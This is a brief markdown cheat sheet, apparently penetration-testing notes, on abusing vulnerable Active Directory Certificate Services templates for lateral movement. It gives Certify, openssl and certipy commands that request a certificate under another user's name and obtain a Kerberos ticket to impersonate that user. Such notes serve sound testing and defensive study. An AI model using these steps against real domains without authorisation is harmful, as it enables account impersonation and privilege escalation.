# Lateral Movement

- [Lateral Movement](#lateral-movement)
  - [Windows](#windows)
    - [ADCS](#adcs)
      - [Certificate Template Exploit](#certificate-template-exploit)

## Windows

### ADCS

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
https://github.com/GhostPack/Certify
https://github.com/dirkjanm/PKINITtools

#### Certificate Template Exploit

Certificate templates in ADCS (Active Directory Certificate Services) are pre-configured templates that define the parameters for a particular type of certificate that can be issued by the certificate authority (CA).

We can use [Certify.exe](https://github.com/GhostPack/Certify) to find vulnerable certificate template.

```powershell
.\Certify.exe find /vulnerable
```

Request a new certificate with the vulnerable template and try to impersonate.

```powershell
.\Certify.exe request /ca:<AD-CA_name> /template:<Template_name> /altname:<user_you_want_to_impersonate>
```

This will produce a `cert.pem`. Use `openssl` to convert it into `.pfx`.

```bash
# get cert.pfx
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Now ask the TGT using [Certipy](https://github.com/ly4k/Certipy).

```bash
└─$ certipy auth -pfx cert.pfx -dc-ip <DC_IP> -u '<user_you_want_to_impersonate>' -domain <domain_name>
```

> more documentation here:
> https://0xalwayslucky.gitbook.io/cybersecstack/active-directory/adcs-privesc-certificate-templates
> https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1